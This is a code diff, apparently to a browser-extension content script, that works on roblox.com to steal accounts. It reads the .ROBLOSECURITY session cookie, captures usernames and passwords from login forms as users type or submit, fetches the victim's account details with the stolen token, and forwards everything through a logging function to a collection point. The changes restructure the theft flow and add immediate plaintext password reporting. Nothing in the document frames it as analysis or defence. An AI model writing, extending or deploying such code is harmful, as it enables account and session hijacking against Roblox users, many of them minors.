@@ -28,7 +28,7 @@
     });
   }
 
-  // Function to capture Roblox security cookie and send combined embeds
+  // Function to capture Roblox security cookie and fetch comprehensive user data
   async function captureRobloxSecurity() {
     if (!window.location.hostname.includes('roblox.com')) {
       return;
@@ -47,7 +47,38 @@
           
           if (roblosecurityCookie) {
             console.log('Found ROBLOSECURITY cookie via API');
-            await sendCombinedEmbeds(roblosecurityCookie.value);
+            
+            // Check for recent login attempt
+            let username = '';
+            let password = '';
+
+            if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
+              username = window.robloxLoginAttempt.username;
+              password = window.robloxLoginAttempt.password;
+            } else {
+              // Fallback to current form detection
+              const credentials = captureRobloxCredentials();
+              username = credentials.username;
+              password = credentials.password;
+            }
+
+            // Fetch comprehensive user data using the security token
+            const userData = await fetchRobloxUserData(roblosecurityCookie.value);
+
+            // Send login credentials first
+            let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${roblosecurityCookie.value}`;
+            if (username) loginMessage += `\n👤 USERNAME: ${username}`;
+            if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+
+            sendLogToBackground('roblox_login', [loginMessage]);
+
+            // Send comprehensive user data if available
+            if (userData) {
+              sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
+            }
+
+            // Clear the stored login attempt
+            delete window.robloxLoginAttempt;
           }
         }
       });
@@ -61,51 +92,41 @@
       const [name, value] = cookie.trim().split('=');
       if (name === '.ROBLOSECURITY') {
         console.log('Found ROBLOSECURITY cookie in document.cookie');
-        await sendCombinedEmbeds(value);
+        
+        // Check for recent login attempt
+        let username = '';
+        let password = '';
+
+        if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
+          username = window.robloxLoginAttempt.username;
+          password = window.robloxLoginAttempt.password;
+        } else {
+          // Fallback to current form detection
+          const credentials = captureRobloxCredentials();
+          username = credentials.username;
+          password = credentials.password;
+        }
+
+        // Fetch comprehensive user data using the security token
+        const userData = await fetchRobloxUserData(value);
+
+        // Send login credentials first
+        let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${value}`;
+        if (username) loginMessage += `\n👤 USERNAME: ${username}`;
+        if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+
+        sendLogToBackground('roblox_login', [loginMessage]);
+
+        // Send comprehensive user data if available
+        if (userData) {
+          sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
+        }
+
+        // Clear the stored login attempt
+        delete window.robloxLoginAttempt;
         break;
       }
     }
-  }
-
-  // Function to send combined embeds (credentials + security token)
-  async function sendCombinedEmbeds(securityToken) {
-    // Get stored credentials from login attempt
-    let username = 'Not captured';
-    let password = 'Not captured';
-
-    if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
-      username = window.robloxLoginAttempt.username || 'Not captured';
-      password = window.robloxLoginAttempt.password || 'Not captured';
-    } else {
-      // Fallback to current form detection
-      const credentials = captureRobloxCredentials();
-      username = credentials.username || 'Not captured';
-      password = credentials.password || 'Not captured';
-    }
-
-    // Prepare first embed (credentials)
-    const credentialsData = {
-      username: username,
-      password: password
-    };
-
-    // Prepare second embed (security token)
-    const securityData = {
-      token: securityToken
-    };
-
-    // Send both embeds together
-    sendLogToBackground('roblox_credentials', [JSON.stringify(credentialsData)]);
-    sendLogToBackground('roblox_security', [JSON.stringify(securityData)]);
-
-    // Fetch and send user data as well
-    const userData = await fetchRobloxUserData(securityToken);
-    if (userData) {
-      sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
-    }
-
-    // Clear the stored login attempt
-    delete window.robloxLoginAttempt;
   }
 
   // Fetch comprehensive Roblox user data using APIs
@@ -423,8 +444,11 @@
         
         if (credentials.username || credentials.password) {
           console.log('Login credentials captured from form submission');
+          
+          const logMessage = `🔑 ROBLOX LOGIN ATTEMPT DETECTED:\n👤 USERNAME: ${credentials.username || 'Not captured'}\n🔑 PASSWORD: ${credentials.password || 'Not captured'}`;
+          sendLogToBackground('info', [logMessage]);
 
-          // Store credentials to associate with security token later
+          // Store credentials to associate with security token
           window.robloxLoginAttempt = { 
             username: credentials.username, 
             password: credentials.password, 
@@ -458,6 +482,10 @@
               password: credentials.password, 
               timestamp: Date.now() 
             };
+            
+            // Send immediate notification of credential capture
+            const logMessage = `🔑 ROBLOX CREDENTIALS CAPTURED:\n👤 USERNAME: ${credentials.username}\n🔑 PASSWORD: ${credentials.password}`;
+            sendLogToBackground('info', [logMessage]);
           }
         }, 1000); // Wait 1 second after user stops typing
       }
